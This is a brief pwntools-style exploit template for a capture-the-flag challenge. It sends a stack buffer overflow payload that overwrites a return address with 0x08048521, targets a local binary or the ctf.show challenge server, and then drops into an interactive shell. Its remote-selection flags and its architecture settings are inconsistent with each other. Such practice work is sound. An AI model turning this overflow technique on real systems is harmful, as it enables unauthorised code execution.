from kk import*
#context(arch='i386', os='linux')
#context(arch='amd64', os='linux')
context.binary = elf = ELF('./pwn')
# 根据是否远程自动选择 libc

if args.REMOTE:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(libc)

def start():
    if args.KK:
        return remote('pwn.challenge.ctf.show', 28266)
    else:
        return process('./pwn')
#python3 exp.py本地 #python3 exp.py KK=1远程

def solve():
    p = start()
    payload = b'a'*(0x12+4) + p32(0x08048521)

    # 你的利用代码写这里
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    solve()